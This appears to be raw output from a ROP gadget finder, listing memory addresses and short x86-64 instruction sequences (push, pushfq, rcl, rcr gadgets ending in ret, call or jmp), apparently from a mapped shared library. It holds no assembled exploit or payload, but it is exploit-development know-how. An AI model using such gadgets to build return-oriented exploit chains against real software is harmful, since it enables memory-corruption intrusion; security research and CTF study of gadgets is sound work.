0x00002aaaaab02eb1 : push rdx ; mov rax, qword ptr [rdx + rax*4 + 0x200] ; ret
0x00002aaaaab44290 : push rdx ; or al, byte ptr [rax] ; add rsp, 0x80 ; ret
0x00002aaaaab5dac6 : push rdx ; or byte ptr [rax - 0x7b], cl ; sal byte ptr [rbp - 0xd], cl ; ret
0x00002aaaaac13822 : push rdx ; or byte ptr [rcx], bh ; ret 0x3875
0x00002aaaaab02e81 : push rdx ; pop rax ; mov eax, dword ptr [rdx + rax*4 + 0x200] ; ret
0x00002aaaaac69c48 : push rdx ; pop rsp ; cld ; jmp rdx
0x00002aaaaac69e30 : push rdx ; push rbp ; cld ; call rdx
0x00002aaaaac69e20 : push rdx ; push rdi ; cld ; call rdx
0x00002aaaaac69e28 : push rdx ; push rsi ; cld ; call rdx
0x00002aaaaac69e38 : push rdx ; push rsp ; cld ; call rdx
0x00002aaaaac7b5f5 : push rdx ; ret
0x00002aaaaac5d334 : push rdx ; retf ; jmp qword ptr [rdi]
0x00002aaaaaaf8aca : push rdx ; sbb ecx, dword ptr [rcx + 0x50895048] ; push rsp ; ret
0x00002aaaaac6ef11 : push rdx ; stc ; call rsp
0x00002aaaaac6a62c : push rdx ; stosd dword ptr [rdi], eax ; cld ; jmp rdx
0x00002aaaaabe6834 : push rdx ; sub byte ptr [rax - 0x77], cl ; ret
0x00002aaaaac6a134 : push rdx ; test bh, ah ; jmp rdx
0x00002aaaaaad6b11 : push rdx ; test dword ptr [rbx + 0x59e7c8ee], esi ; pop rbx ; ret 0x2a63
0x00002aaaaab47cb8 : push rdx ; xor byte ptr [rbx + 0x374fff8], al ; and dword ptr [rbx], 0xffffffef ; pop rbx ; ret
0x00002aaaaab7a437 : push rsi ; adc bl, dh ; movq qword ptr [rdi], mm0 ; movdqu xmmword ptr [rdi + 0x10], xmm2 ; ret
0x00002aaaaac428e4 : push rsi ; adc byte ptr [rsi + 0xf], ah ; cmp byte ptr [rdi], dl ; ret 0x830f
0x00002aaaaab7eb39 : push rsi ; add ah, byte ptr [rdx - 0xf] ; jl 0xa9b90 ; adc dword ptr [rsi + 3], edx ; ret
0x00002aaaaab470a2 : push rsi ; add al, 0x48 ; mov dword ptr [rax], edx ; mov eax, dword ptr [rsi] ; pop rbx ; ret
0x00002aaaaab56314 : push rsi ; add al, byte ptr [rax] ; add byte ptr [rcx - 0x77], cl ; ret 0x854d
0x00002aaaaac43e98 : push rsi ; add al, byte ptr [rax] ; movsxd rcx, dword ptr [r11 + rdx*4] ; add rcx, r11 ; jmp rcx
0x00002aaaaab4abe0 : push rsi ; add byte ptr [rax], al ; mov edx, eax ; jmp 0x75b83
0x00002aaaaac2fb51 : push rsi ; add cl, byte ptr [rbx + 0x257890e] ; mov dword ptr [rdi], ecx ; ret
0x00002aaaaabcda16 : push rsi ; add dword ptr [rax + 0x39], ecx ; ret 0xc72
0x00002aaaaac85595 : push rsi ; add dword ptr [rax], eax ; call 0x221afb1d
0x00002aaaaac855f5 : push rsi ; add dword ptr [rax], eax ; jnp 0x1b05f6 ; jmp qword ptr [rcx]
0x00002aaaaac85625 : push rsi ; add dword ptr [rax], eax ; js 0x1b06ab ; cmc ; jmp qword ptr [rcx]
0x00002aaaaac8557d : push rsi ; add dword ptr [rax], eax ; sar byte ptr [rdx - 0xb], 1 ; jmp qword ptr [rcx]
0x00002aaaaac855dd : push rsi ; add dword ptr [rax], eax ; xor byte ptr [rbx - 0xb], bh ; jmp qword ptr [rcx]
0x00002aaaaac2fbc1 : push rsi ; add dword ptr [rbx + 0x157890e], ecx ; mov dword ptr [rdi], ecx ; ret
0x00002aaaaab7a245 : push rsi ; add eax, 0x480f8948 ; mov dword ptr [rdi + 5], edx ; ret
0x00002aaaaaaf5c29 : push rsi ; add eax, dword ptr [rax] ; add byte ptr [rax - 0x7d], cl ; ret
0x00002aaaaac2fae1 : push rsi ; add ecx, dword ptr [rbx + 0x357890e] ; mov dword ptr [rdi], ecx ; ret
0x00002aaaaab7b7f3 : push rsi ; add ecx, dword ptr [rcx + 0x357890f] ; lea rax, qword ptr [rdi + 6] ; ret
0x00002aaaaab7c623 : push rsi ; add ecx, dword ptr [rcx + 0x357890f] ; lea rax, qword ptr [rdi + 7] ; ret
0x00002aaaaab7a1e3 : push rsi ; add ecx, dword ptr [rcx + 0x357890f] ; ret
0x00002aaaaac428f9 : push rsi ; and byte ptr [rsi + 0xf], ah ; cmp byte ptr [rdi], dl ; ret 0x830f
0x00002aaaaac26e16 : push rsi ; clc ; mov qword ptr [rdi - 0x10], r11 ; mov qword ptr [rdi - 8], rdx ; ret
0x00002aaaaac27786 : push rsi ; clc ; mov qword ptr [rdi - 0xd], rcx ; mov qword ptr [rdi - 8], rdx ; ret
0x00002aaaaac27986 : push rsi ; clc ; mov qword ptr [rdi - 0xe], rcx ; mov qword ptr [rdi - 8], rdx ; ret
0x00002aaaaac27b86 : push rsi ; clc ; mov qword ptr [rdi - 0xf], rcx ; mov qword ptr [rdi - 8], rdx ; ret
0x00002aaaaac26e32 : push rsi ; clc ; mov qword ptr [rdi - 8], rdx ; ret
0x00002aaaaac69fa9 : push rsi ; cld ; call qword ptr [rax + 0x10fffc55]
0x00002aaaaac69fa5 : push rsi ; cld ; call qword ptr [rax]
0x00002aaaaac69e29 : push rsi ; cld ; call rdx
0x00002aaaaac69f69 : push rsi ; cld ; jmp qword ptr [rax + 0x20fffc55]
0x00002aaaaac69f65 : push rsi ; cld ; jmp qword ptr [rax]
0x00002aaaaac275a1 : push rsi ; cld ; mov dword ptr [rdi - 4], edx ; ret
0x00002aaaaac271d5 : push rsi ; cld ; mov qword ptr [rdi - 0xa], rcx ; mov dword ptr [rdi - 4], edx ; ret
0x00002aaaaac273b5 : push rsi ; cld ; mov qword ptr [rdi - 0xb], rcx ; mov dword ptr [rdi - 4], edx ; ret
0x00002aaaaac27595 : push rsi ; cld ; mov qword ptr [rdi - 0xc], rcx ; mov dword ptr [rdi - 4], edx ; ret
0x00002aaaaac26ff5 : push rsi ; cld ; mov qword ptr [rdi - 9], rcx ; mov dword ptr [rdi - 4], edx ; ret
0x00002aaaaab8f69d : push rsi ; cld ; test edx, edx ; mov dword ptr [rsi + rcx], edx ; jne 0xba6a2 ; ret
0x00002aaaaac6f711 : push rsi ; cli ; jmp rsp
0x00002aaaaac279a1 : push rsi ; cli ; mov ecx, dword ptr [rsi - 4] ; mov dword ptr [rdi - 6], edx ; mov dword ptr [rdi - 4], ecx ; ret
0x00002aaaaac59c80 : push rsi ; cli ; push 0x6e ; ja 0x184c0f ; ret 0x48f
0x00002aaaaac46246 : push rsi ; cmc ; sub eax, edx ; ret
0x00002aaaaac46236 : push rsi ; hlt ; sub eax, edx ; ret
0x00002aaaaac46206 : push rsi ; int1 ; sub eax, edx ; ret
0x00002aaaaabe7712 : push rsi ; je 0x112728 ; mov eax, 7 ; ret
0x00002aaaaac71dd9 : push rsi ; jmp 0x1b90e1
0x00002aaaaabca33b : push rsi ; js 0xf538f ; mov dword ptr [rdi + 0x80], edx ; ret
0x00002aaaaabcacd8 : push rsi ; js 0xf5d2c ; mov dword ptr [rdi + 0x100], edx ; ret
0x00002aaaaac69570 : push rsi ; mov dh, 0xfd ; call rcx
0x00002aaaaab2b808 : push rsi ; or al, 0x83 ; ret
0x00002aaaaab2b78b : push rsi ; or al, 0xf6 ; ret 0xf08
0x00002aaaaac093c1 : push rsi ; or byte ptr [rax - 0x75], cl ; mov qword ptr [rsi + 0x10], rax ; ret
0x00002aaaaac09c61 : push rsi ; or byte ptr [rax - 0x75], cl ; push rax ; mov qword ptr [rsi + 0x10], rax ; ret
0x00002aaaaab68f7d : push rsi ; or byte ptr [rax - 0x7d], cl ; ret 0x4802
0x00002aaaaab8f66e : push rsi ; or byte ptr [rcx], bh ; push rdi ; or byte ptr [rbp - 0x28], dh ; ret
0x00002aaaaab7a3d7 : push rsi ; or eax, 0x77f0ff3 ; movdqu xmmword ptr [rdi + 0xd], xmm2 ; ret
0x00002aaaaabd5ad1 : push rsi ; pop rbx ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x00002aaaaac590e0 : push rsi ; pop rdx ; je 0x1840ac ; ret 0xacfc
0x00002aaaaab7a417 : push rsi ; psllq mm1, qword ptr [rdi] ; jg 0xa542f ; movdqu xmmword ptr [rdi + 0xf], xmm2 ; ret
0x00002aaaaab7b0e7 : push rsi ; psllq mm1, qword ptr [rdi] ; jg 0xa60ff ; movdqu xmmword ptr [rdi + 0xf], xmm2 ; ret
0x00002aaaaab7d4f7 : push rsi ; psllq mm1, qword ptr [rdi] ; jg 0xa850f ; movdqu xmmword ptr [rdi + 0xf], xmm2 ; ret
0x00002aaaaab7dfc7 : push rsi ; psllq mm1, qword ptr [rdi] ; jg 0xa8fdf ; movdqu xmmword ptr [rdi + 0xf], xmm2 ; ret
0x00002aaaaab09bcf : push rsi ; ret
0x00002aaaaabb9597 : push rsi ; ret 0x7420
0x00002aaaaab73e1a : push rsi ; ret 0x7518
0x00002aaaaab36bbf : push rsi ; ret 0xf02
0x00002aaaaabb8f71 : push rsi ; ret 0xf08
0x00002aaaaab2d2e8 : push rsi ; ret 0xf10
0x00002aaaaac27ba1 : push rsi ; stc ; mov ecx, dword ptr [rsi - 4] ; mov dword ptr [rdi - 7], edx ; mov dword ptr [rdi - 4], ecx ; ret
0x00002aaaaac277a1 : push rsi ; sti ; mov ecx, dword ptr [rsi - 4] ; mov dword ptr [rdi - 5], edx ; mov dword ptr [rdi - 4], ecx ; ret
0x00002aaaaab55eca : push rsi ; sub al, 0x34 ; add dh, dh ; ret 0xf02
0x00002aaaaabc33af : push rsi ; sub byte ptr [rax - 0x7d], cl ; ret
0x00002aaaaac46216 : push rsi ; sub eax, edx ; ret
0x00002aaaaac6a5c8 : push rsi ; test al, 0xfc ; jmp rsi
0x00002aaaaabcf9b7 : push rsi ; xor ax, ax ; ret
0x00002aaaaac4290e : push rsi ; xor byte ptr [rsi + 0xf], ah ; cmp byte ptr [rdi], dl ; ret 0x830f
0x00002aaaaac6def8 : push rsp ; adc edi, esi ; jmp rsp
0x00002aaaaac440ca : push rsp ; add al, byte ptr [rax] ; movsxd rcx, dword ptr [r11 + rdx*4] ; add rcx, r11 ; jmp rcx
0x00002aaaaac75880 : push rsp ; add byte ptr [rax], al ; add ah, dl ; add eax, dword ptr [rax] ; add byte ptr [rax - 0x30], bl ; in al, dx ; jmp rbx
0x00002aaaaac74f90 : push rsp ; add byte ptr [rax], al ; add byte ptr [rax + rdx*2], bl ; add byte ptr [rax - 0x4a], bl ; jmp 0x19ffa6
0x00002aaaaac6aa81 : push rsp ; add byte ptr [rax], al ; xchg eax, esi ; or al, byte ptr [rax] ; add byte ptr [rbp + rbx*4 - 0x18], al ; call rsp
0x00002aaaaac853e5 : push rsp ; add dword ptr [rax], eax ; pop rax ; js 0x1b03e6 ; jmp qword ptr [rbx]
0x00002aaaaabe32f1 : push rsp ; and al, 0x10 ; mov edi, 0x2000004 ; call rax
0x00002aaaaabe31ed : push rsp ; and al, 0x10 ; mov rsi, qword ptr [rsp + 8] ; call rax
0x00002aaaaabb85cf : push rsp ; and al, 0x18 ; call 0x1f8a5
0x00002aaaaab12fe3 : push rsp ; and al, 0x18 ; call 0x3c0a9
0x00002aaaaac00c08 : push rsp ; and al, 0x18 ; lea r9, qword ptr [rsp + 0x2c] ; call qword ptr [rax]
0x00002aaaaab55d10 : push rsp ; and al, 0x20 ; call qword ptr [rax]
0x00002aaaaab5608c : push rsp ; and al, 0x20 ; call rax
0x00002aaaaab8eb3e : push rsp ; and al, 0x20 ; mov rsi, r14 ; mov rdi, r12 ; call rbx
0x00002aaaaabc8507 : push rsp ; and al, 0x2f ; mov qword ptr [rsp + 0x40], rax ; call 0x1f7fa
0x00002aaaaac17b2a : push rsp ; and al, 0x38 ; add rax, qword ptr [rdx + 8] ; add rsp, 0x48 ; ret
0x00002aaaaabd2164 : push rsp ; and al, 0x38 ; mov eax, edx ; add rsp, 0x48 ; ret
0x00002aaaaab085d5 : push rsp ; and al, 0x38 ; mov qword ptr [rsp + 0x28], rcx ; call 0x1f8aa
0x00002aaaaab58d3a : push rsp ; and al, 0x68 ; call rax
0x00002aaaaab5a0ca : push rsp ; and al, 0x68 ; mov rsi, r13 ; mov rdi, rbx ; call rax
0x00002aaaaab3fa54 : push rsp ; and al, 0xc ; call 0xf6d05
0x00002aaaaac6ce20 : push rsp ; and al, 0xf3 ; jmp rsp
0x00002aaaaac6d790 : push rsp ; and al, 0xf6 ; call rsp
0x00002aaaaab1f1d0 : push rsp ; and al, 0xf8 ; movsd xmm0, qword ptr [rsp - 8] ; ret
0x00002aaaaab1f18a : push rsp ; and al, 0xfc ; movss xmm0, dword ptr [rsp - 4] ; ret
0x00002aaaaaaf4c00 : push rsp ; and al, 8 ; mov eax, dword ptr [rbx + 4] ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaab0df66 : push rsp ; and al, 8 ; mov rsi, qword ptr [r15] ; mov rdi, qword ptr [r13] ; call r14
0x00002aaaaab0cd65 : push rsp ; and al, 8 ; mov rsi, r12 ; mov rdi, rbp ; call r15
0x00002aaaaab0e1a5 : push rsp ; and al, 8 ; mov rsi, r15 ; mov rdi, r13 ; call r14
0x00002aaaaab559a2 : push rsp ; and eax, 0x950f4100 ; ret
0x00002aaaaac83851 : push rsp ; call rsi
0x00002aaaaac8fcf1 : push rsp ; clc ; call qword ptr [rax]
0x00002aaaaac8fd29 : push rsp ; clc ; jmp qword ptr [rcx]
0x00002aaaaac6e9e8 : push rsp ; clc ; jmp rsp
0x00002aaaaac69fb9 : push rsp ; cld ; call qword ptr [rax + 0x10fffc53]
0x00002aaaaac69fb5 : push rsp ; cld ; call qword ptr [rax]
0x00002aaaaac69e39 : push rsp ; cld ; call rdx
0x00002aaaaac69f79 : push rsp ; cld ; jmp qword ptr [rax + 0x20fffc53]
0x00002aaaaac69f75 : push rsp ; cld ; jmp qword ptr [rax]
0x00002aaaaac7afe9 : push rsp ; cli ; call qword ptr [rax]
0x00002aaaaac5e04b : push rsp ; cmc ; call rsp
0x00002aaaaac6d3d0 : push rsp ; cmc ; dec esp ; add dword ptr [eax], eax ; test byte ptr [rdx - 0xb], al ; jmp rsp
0x00002aaaaab029cf : push rsp ; cmp dword ptr [rax], eax ; mov qword ptr [rax], rdx ; ret
0x00002aaaaac6caa0 : push rsp ; cmpsd dword ptr [rsi], dword ptr [rdi] ; int1 ; jmp rsp
0x00002aaaaac6ddb0 : push rsp ; div esi ; call rsp
0x00002aaaaac6e9e4 : push rsp ; fiadd word ptr [rcx] ; add byte ptr [rcx + rcx*2 - 8], dl ; jmp rsp
0x00002aaaaac5d6e9 : push rsp ; hlt ; call qword ptr [rcx]
0x00002aaaaac5d6f5 : push rsp ; hlt ; jmp qword ptr [rdx]
0x00002aaaaac5d6f1 : push rsp ; hlt ; jmp qword ptr [rip + 0x22fff454]
0x00002aaaaac5d6ed : push rsp ; hlt ; lcall ptr [rbx] ; push rsp ; hlt ; jmp qword ptr [rip + 0x22fff454]
0x00002aaaaac5d741 : push rsp ; hlt ; push rbp ; push rsp ; hlt ; jmp qword ptr [rdx]
0x00002aaaaac7688c : push rsp ; imul eax, dword ptr [rax], 0xed012000 ; call qword ptr [rsi]
0x00002aaaaac6a40c : push rsp ; ja 0x19540e ; jmp rsp
0x00002aaaaaba1e26 : push rsp ; jne 0xccdb3 ; mov eax, 0x7d00 ; ret
0x00002aaaaac7708c : push rsp ; jno 0x1a2096 ; add byte ptr [rax], dh ; in eax, dx ; call rdx
0x00002aaaaab7357b : push rsp ; lea rax, qword ptr [rdi + rax + 0x10] ; ret
0x00002aaaaabd2740 : push rsp ; mov byte ptr [rax + rax], ch ; ret
0x00002aaaaac09477 : push rsp ; mov eax, 1 ; ret
0x00002aaaaac7b98c : push rsp ; mov edx, 0x73700000 ; out dx, eax ; call rax
0x00002aaaaac6f928 : push rsp ; movabs al, byte ptr [0xa074000250bcfffa] ; cli ; call rsp
0x00002aaaaab097fa : push rsp ; or eax, 0x15ef10 ; orpd xmm0, xmm1 ; ret
0x00002aaaaac6e558 : push rsp ; out 0xf7, al ; jmp rsp
0x00002aaaaac86d8c : push rsp ; outsb dx, byte ptr [rsi] ; add dword ptr [rax], eax ; nop ; and esi, esi ; jmp qword ptr [rsi]
0x00002aaaaaba201b : push rsp ; push rbx ; je 0xccffc ; mov eax, 1 ; ret
0x00002aaaaaba201a : push rsp ; push rbx ; je 0xccffd ; mov eax, 1 ; ret
0x00002aaaaac5d930 : push rsp ; push rcx ; hlt ; jmp qword ptr [rdx]
0x00002aaaaac5d644 : push rsp ; push rdx ; hlt ; jmp qword ptr [rdx]
0x00002aaaaaaf8ad1 : push rsp ; ret
0x00002aaaaab09df8 : push rsp ; ret 0x2e0f
0x00002aaaaabde844 : push rsp ; ret 0x8940
0x00002aaaaab09aba : push rsp ; ret 0xf66
0x00002aaaaac6e50b : push rsp ; ret 1
0x00002aaaaabbba33 : push rsp ; ror dword ptr [rcx + rcx*4], cl ; push rsp ; ret
0x00002aaaaac6c8dc : push rsp ; sbb byte ptr [rcx], al ; add ah, dh ; int1 ; call rsp
0x00002aaaaac6f3c8 : push rsp ; sti ; stc ; jmp rsp
0x00002aaaaac6a6f4 : push rsp ; stosb byte ptr [rdi], al ; cld ; jmp rsp
0x00002aaaaabd5ddb : push rsp ; sub al, 0 ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaac6c450 : push rsp ; xor ch, bh ; call rsp
0x00002aaaaab30f4f : pushfq ; adc al, byte ptr [rax] ; movsxd rdx, dword ptr [rax + rdx*4] ; add rax, rdx ; jmp rax
0x00002aaaaac1b410 : pushfq ; adc eax, 0x83480000 ; ret 0xe910
0x00002aaaaac803d4 : pushfq ; add al, 1 ; add byte ptr [rax], bl ; call rcx
0x00002aaaaac6f6dc : pushfq ; add al, byte ptr [rax] ; push rbx ; cli ; call rsp
0x00002aaaaabed998 : pushfq ; add byte ptr [rax], al ; add byte ptr [rax - 1], bh ; pop rbx ; pop rbp ; ret
0x00002aaaaab5a7dd : pushfq ; add dword ptr [rax], eax ; add byte ptr [rcx - 0x7d], cl ; ret 0xe96e
0x00002aaaaac83dd4 : pushfq ; add dword ptr ds:[rax], eax ; sub byte ptr [rdi], bl ; cmc ; jmp qword ptr [rcx]
0x00002aaaaac073a9 : pushfq ; add eax, 0x5ba00 ; add byte ptr [rax], al ; call 0x2e62a
0x00002aaaaac30427 : pushfq ; add eax, dword ptr [rax] ; movsxd rdx, dword ptr [r11 + rdx*4] ; lea rdx, qword ptr [r11 + rdx] ; jmp rdx
0x00002aaaaac908a4 : pushfq ; add ebp, esi ; add al, byte ptr [rax] ; ret 0x503
0x00002aaaaac84bd4 : pushfq ; add qword ptr [rax], r8 ; call 0x221af150
0x00002aaaaaaf8ff1 : pushfq ; and al, 0x90 ; add byte ptr [rax], al ; add dh, dh ; ret 0x4801
0x00002aaaaabaf650 : pushfq ; and al, 0xa0 ; add byte ptr [rax], al ; add byte ptr [rbp - 0x7cb7fead], cl ; ret
0x00002aaaaabaf65f : pushfq ; and al, 0xa0 ; add byte ptr [rax], al ; add byte ptr [rcx], bh ; ret 0x8d0f
0x00002aaaaac6f2a4 : pushfq ; and al, 2 ; add byte ptr [rcx + rdx*8], al ; stc ; call rsp
0x00002aaaaac6a991 : pushfq ; cld ; call qword ptr [rax + 0x10fffca4]
0x00002aaaaac6a951 : pushfq ; cld ; jmp qword ptr [rax + 0x20fffca4]
0x00002aaaaac8d9d4 : pushfq ; fiadd dword ptr [rcx] ; add al, ch ; fdivrp st(7) ; jmp rdi
0x00002aaaaaaf4b06 : pushfq ; jmp 0x1face
0x00002aaaaac6c0ec : pushfq ; loope 0x1970f6 ; add byte ptr [rdx + rbp*2 - 0x12], al ; jmp rsp
0x00002aaaaab4d41c : pushfq ; mov eax, 0xffffffff ; pop rbx ; ret
0x00002aaaaac6bbac : pushfq ; mov edi, 0xc7440000 ; in eax, dx ; call rsp
0x00002aaaaabd8c08 : pushfq ; mov esp, 0x8b49fff1 ; jge 0x103c18 ; call rbx
0x00002aaaaac8a3d4 : pushfq ; movsb byte ptr [rdi], byte ptr [rsi] ; add dword ptr [rax], eax ; test al, 0xf1 ; sti ; call rcx
0x00002aaaaac1c110 : pushfq ; or byte ptr [rax], al ; add byte ptr [rax - 0x7d], cl ; ret 0xe910
0x00002aaaaac1a0c4 : pushfq ; or eax, 0x83480000 ; ret 0xeb10
0x00002aaaaac6b6f4 : pushfq ; popfq ; add byte ptr [rax], al ; and al, 0x50 ; jmp 0x196702
0x00002aaaaaaeeee8 : pushfq ; ret
0x00002aaaaab91bdf : pushfq ; ret 0xb60f
0x00002aaaaab805cb : pushfq ; ror byte ptr [rdi], 0xb6 ; sal bh, 0xd8 ; ret
0x00002aaaaac6b8dc : pushfq ; stosb byte ptr [rdi], al ; add byte ptr [rax], al ; je 0x196946 ; in eax, dx ; jmp rsp
0x00002aaaaac6cbdc : pushfq ; sub al, 1 ; add byte ptr [rdx + rdx*2], dl ; call rsp
0x00002aaaaac75a80 : rcl ah, 1 ; in al, dx ; call rsp
0x00002aaaaabab3ec : rcl ah, 1 ; sti ; lcall ptr [rbx + 0x31] ; rcr byte ptr [rbp + 0x41], 0x5c ; ret
0x00002aaaaabcd4ca : rcl ah, cl ; stc ; dec dword ptr [rax + 0x39] ; ret
0x00002aaaaabf157c : rcl byte ptr [rbx + 0x4858fff3], 0x89 ; fcomp dword ptr [rdx + 0x5b] ; ret
0x00002aaaaac6aa40 : rcl byte ptr [rcx - 0x6caf0004], 1 ; cld ; call rax
0x00002aaaaac6aa04 : rcl byte ptr [rdx - 0x6baf0004], 1 ; cld ; call rax
0x00002aaaaac5d998 : rcl byte ptr [rdx - 0xc], 0xff ; loopne 0x1889fb ; hlt ; jmp qword ptr [rax + 0x26fff452]
0x00002aaaaac8ef20 : rcl byte ptr [rdx], 0xf8 ; jmp qword ptr [rbx]
0x00002aaaaac144bc : rcl byte ptr [rip - 0x7cb70004], 1 ; clc ; dec dword ptr [rax - 0x77] ; ret 0x840f
0x00002aaaaac69e34 : rcl byte ptr [rsp + rdi*8 - 1], cl ; push rdx ; push rsp ; cld ; call rdx
0x00002aaaaac697c4 : rcl cl, 0xfb ; call qword ptr [rax]
0x00002aaaaabc9fa0 : rcl dword ptr [rax - 0x3f], -0x17 ; add esi, ebx ; stosq qword ptr [rdi], rax ; ret
0x00002aaaaabd41fb : rcl dword ptr [rdx + 1], 0 ; add rsp, 0x80 ; ret
0x00002aaaaac590df : rcl dword ptr [rsi + 0x5a], cl ; je 0x1840ad ; ret 0xacfc
0x00002aaaaac590db : rcpps xmm2, xmmword ptr [rdx + 0x5a56d373] ; je 0x1840b1 ; ret 0xacfc
0x00002aaaaabd8cfc : rcr bh, 0xff ; dec dword ptr [rcx - 0x75] ; call rbx
0x00002aaaaab09f9f : rcr bl, 0x3f ; fsubp st(1) ; ret
0x00002aaaaabaf2c3 : rcr byte ptr [rbp + 0x41], 0x5c ; pop r13 ; pop r14 ; pop r15 ; ret
0x00002aaaaab111b0 : rcr byte ptr [rbp + 0x41], 0x5c ; pop r13 ; pop r14 ; ret
0x00002aaaaabd08ee : rcr byte ptr [rbp + 0x41], 0x5c ; pop r13 ; ret
0x00002aaaaaaf4b76 : rcr byte ptr [rbp + 0x41], 0x5c ; ret
0x00002aaaaab9e030 : rcr byte ptr [rbp + 0x41], 1 ; pop rsp ; pop r13 ; pop r14 ; ret
0x00002aaaaab1ca13 : rcr byte ptr [rbp + 0x41], 1 ; pop rsp ; ret
0x00002aaaaab1d437 : rcr byte ptr [rbp + 0x5b], 1 ; ret
0x00002aaaaab016c5 : rcr byte ptr [rbx + 0x41], 0x5c ; pop r13 ; pop r14 ; pop r15 ; pop rbp ; ret
0x00002aaaaaba1858 : rcr byte ptr [rbx + 0x41], 0x5c ; pop r13 ; pop rbp ; ret
0x00002aaaaabfdb23 : rcr byte ptr [rbx + 0x41], 1 ; pop rsp ; pop r13 ; pop r14 ; pop r15 ; pop rbp ; ret
0x00002aaaaabd09da : rcr byte ptr [rbx + 0x44], 0x89 ; rcr byte ptr [rbp + 0x41], 0x5c ; pop r13 ; ret
0x00002aaaaab4328d : rcr byte ptr [rbx + 0x48], cl ; div ebp ; pop rbp ; pop r12 ; pop r13 ; ret
0x00002aaaaab0c218 : rcr byte ptr [rbx + 0x5d], 0x41 ; pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
0x00002aaaaab4a051 : rcr byte ptr [rbx + 0x5d], 0x41 ; pop rsp ; pop r13 ; pop r14 ; ret
0x00002aaaaaaf7b50 : rcr byte ptr [rbx + 0x5d], 0x41 ; pop rsp ; pop r13 ; ret
0x00002aaaaab8f9b9 : rcr byte ptr [rbx + 0x5d], 0x41 ; pop rsp ; pop r14 ; ret
0x00002aaaaab0f26e : rcr byte ptr [rbx + 0x5d], 0x41 ; pop rsp ; ret
0x00002aaaaaaf6891 : rcr byte ptr [rbx + 0x5d], 1 ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x00002aaaaab9e07c : rcr byte ptr [rbx + 0x5d], 1 ; pop r12 ; pop r13 ; pop r14 ; ret
0x00002aaaaab29b8b : rcr byte ptr [rbx + 0x5d], 1 ; pop r12 ; pop r13 ; ret
0x00002aaaaab58ff8 : rcr byte ptr [rbx + 0x5d], 1 ; pop r12 ; ret
0x00002aaaaab1ac48 : rcr byte ptr [rbx + 0x5d], 1 ; ret
0x00002aaaaab44b6b : rcr byte ptr [rbx + 0x5d], cl ; pop r12 ; mov rax, qword ptr [rax + 0x48] ; jmp rax
0x00002aaaaab45150 : rcr byte ptr [rbx - 0x3d], 1 ; nop dword ptr [rax + rax] ; mov eax, edi ; ret
0x00002aaaaab9e109 : rcr byte ptr [rbx - 0x77], cl ; rcr byte ptr [rbp + 0x41], 1 ; pop rsp ; pop r13 ; pop r14 ; ret
0x00002aaaaabe0de8 : rcr byte ptr [rbx - 0x77], cl ; rcr byte ptr [rbp + 0x41], 1 ; pop rsp ; ret
0x00002aaaaac594fd : rcr byte ptr [rdi + 0x6d], cl ; test eax, 0x7d4c8c5d ; ret 0xd8f
0x00002aaaaac83e50 : rcr byte ptr [rdi], 1 ; cmc ; jmp qword ptr [rdx]
0x00002aaaaac69d70 : rcr byte ptr [rsi - 4], 0xff ; push rax ; pop rsi ; cld ; jmp rax
0x00002aaaaac69afc : rcr byte ptr [rsi], 1 ; cld ; jmp qword ptr [rax]
0x00002aaaaab1d469 : rcr dword ptr [rcx], -0x40 ; and eax, 2 ; sub eax, 1 ; ret
0x00002aaaaac1bdcc : rcr dword ptr [rdx], 0xf ; xchg ah, bl ; or eax, dword ptr [rax] ; add byte ptr [rax - 0x7d], cl ; ret 0xe910
0x00002aaaaac1fd79 : rcr dword ptr [rdx], 0xf ; xchg bh, bh ; add eax, 0x83480000 ; ret 0x4910
0x00002aaaaac1f599 : rcr dword ptr [rdx], 0xf ; xchg bh, bl ; or eax, 0x83480000 ; ret 0x4910
0x00002aaaaac1f989 : rcr dword ptr [rdx], 0xf ; xchg bh, ch ; or dword ptr [rax], eax ; add byte ptr [rax - 0x7d], cl ; ret 0x4910
0x00002aaaaac1f1a9 : rcr dword ptr [rdx], 0xf ; xchg bh, cl ; adc dword ptr [rax], eax ; add byte ptr [rax - 0x7d], cl ; ret 0x4910
0x00002aaaaac1c92c : rcr dword ptr [rdx], 0xf ; xchg byte ptr [rax + rax], bh ; add byte ptr [rax - 0x7d], cl ; ret 0xe910
0x00002aaaaac1c10c : rcr dword ptr [rdx], 0xf ; xchg byte ptr [rax + rcx - 0x7cb80000], bl ; ret 0xe910
0x00002aaaaac1b8ec : rcr dword ptr [rdx], 0xf ; xchg byte ptr [rax + rdx - 0x7cb80000], bh ; ret 0xe910
0x00002aaaaac1f348 : rcr dword ptr [rdx], 0xf ; xchg byte ptr [rax], dh ; adc byte ptr [rax], al ; add byte ptr [rax - 0x7d], cl ; ret 0xe910
0x00002aaaaac1c44c : rcr dword ptr [rdx], 0xf ; xchg byte ptr [rbp + rax], bl ; add byte ptr [rax - 0x7d], cl ; ret 0xe910
0x00002aaaaac1bc2c : rcr dword ptr [rdx], 0xf ; xchg byte ptr [rbp + rcx], bh ; add byte ptr [rax - 0x7d], cl ; ret 0xe910
0x00002aaaaac1b40c : rcr dword ptr [rdx], 0xf ; xchg byte ptr [rbp + rdx - 0x7cb80000], bl ; ret 0xe910
0x00002aaaaac1c5ec : rcr dword ptr [rdx], 0xf ; xchg byte ptr [rbx + rax - 0x7cb80000], bh ; ret 0xe910
0x00002aaaaac1f839 : rcr dword ptr [rdx], 0xf ; xchg byte ptr [rdi], bh ; or eax, dword ptr [rax] ; add byte ptr [rax - 0x7d], cl ; ret 0x4910
0x00002aaaaac1f059 : rcr dword ptr [rdx], 0xf ; xchg byte ptr [rdi], bl ; adc eax, dword ptr [rax] ; add byte ptr [rax - 0x7d], cl ; ret 0x4910
0x00002aaaaac20169 : rcr dword ptr [rdx], 0xf ; xchg byte ptr [rdi], cl ; add al, byte ptr [rax] ; add byte ptr [rax - 0x7d], cl ; ret 0x4910
0x00002aaaaac1b74c : rcr dword ptr [rdx], 0xf ; xchg byte ptr [rdx + rdx], bl ; add byte ptr [rax - 0x7d], cl ; ret 0xe910
0x00002aaaaac1b882 : rcr dword ptr [rdx], 0xf ; xchg byte ptr [rsi], ah ; adc dword ptr [rax], eax ; add byte ptr [rax - 0x7d], cl ; ret 0x4910
